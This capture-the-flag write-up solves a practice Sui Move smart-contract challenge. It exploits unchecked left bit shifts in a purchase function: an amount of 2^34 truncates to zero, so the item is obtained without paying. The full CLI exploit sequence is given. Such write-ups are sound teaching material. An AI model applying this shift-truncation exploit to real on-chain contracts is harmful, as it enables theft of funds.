# Shopping

Practice challenge on [Cyclens Platform](https://platform.cyclens.tech/challenge/39).

Description: 小明看着最近爆火的 Labubu 也想要入手一个，但是无奈钱包的钱不够，该怎么办呢？

After reading the source code, we know to get flag we need to purchase a Labubu with our card:

```rust
public entry fun get_flag(labubu: &Labubu, card: &Card, ctx: &mut TxContext) {
    assert!(labubu.get_labubu_owner() == card.owner, EOWNER);

    event::emit(FlagEvent {
        owner: ctx.sender(),
        flag: true
    });
}
```

Claiming the card gives us only 1 balance but a Labubu costs 5. We need to exploit this function:

```rust
public entry fun buy(amt: u64, card: &mut Card, market: &mut Market, i: u64, ctx: &mut TxContext) {
    assert!(!(amt < market.get_labubu_price(i)), EPAYPRICE);

    let split_amt = amt << 30;
    
    assert!(((card.balance.value() << 30) - split_amt) >= 0, ENOTENOUGHBALANCE);

    market.pay(card.balance.split(split_amt >> 30));
    
    market::transfer_labubu_owner(market, i, ctx);
    transfer::public_transfer(market::get_labubu(market, i), ctx.sender());
}
```

Immediately we think of some overflow vulnerability as we have some right shifts to balance and the `amt` is a `u64`. After looking at this [SlowMist SUI Move Contract Audit Method](https://github.com/slowmist/Sui-MOVE-Smart-Contract-Auditing-Primer?tab=readme-ov-file#overflow-audit), we saw this:

> Move performs overflow checks during mathematical operations, and transactions with overflow will fail. However, bitwise operations do not undergo such checks. Additionally, custom overflow detection functions may have flaws that lead to value truncation issues.

In fact this challenge seems to be inspired from the recent [Cetus Hack](https://chainvestigate.com/en/cetus-protocol-hack-analysis):

> Among the functions defined in the module is `checked_shlw`, a utility function responsible for performing a left bitwise shift on a 256-bit unsigned integer while simultaneously checking for potential overflow. This is a crucial safety measure because shifting a large integer too far left can exceed the allowable 256-bit range, causing bits to be truncated — a dangerous arithmetic error.

Therefore, we craft `amt = 2^34` where `split_amt = amt << 30` overflows to 0. Then we can claim a Labubu for free without paying anything.

The entire exploit can be done with Client CLI:

```bash
export PACKAGE=0xfce3ac708c34b1e996e476877aaa185ee218f84ea457c87e4f742fc7095c4147
export MARKET=0x29464c14794ae185dda9d2f0fdc06c4da8b59f177d4e87ee9a7a50c2a68010ac
export MINTCAP=0x37aa4b7d08f78f252bac84f9615ad28fb55a95401cfc2ade028ad66697054e35
# Open card
sui client call --package $PACKAGE --module challenge --function open_card --gas-budget 100000000
export CARD=0xb7947ee385731de0ea253c09a7965e14620a234a189b864ad68264199c2e4c00
# Claim balance and buy Labubu with amt=2^34
sui client call --package $PACKAGE --module challenge --function claim --args $CARD $MINTCAP --gas-budget 100000000
sui client call --package $PACKAGE --module challenge --function buy --args 17179869184 $CARD $MARKET 0 --gas-budget 100000000
export LABUBU=0x44d0bae89c32fed0fb90f383fb46231cf2ff7b8fda49fe3bfd8c56a16645ee1d
sui client call --package $PACKAGE --module challenge --function get_flag --args $LABUBU $CARD --gas-budget 100000000
```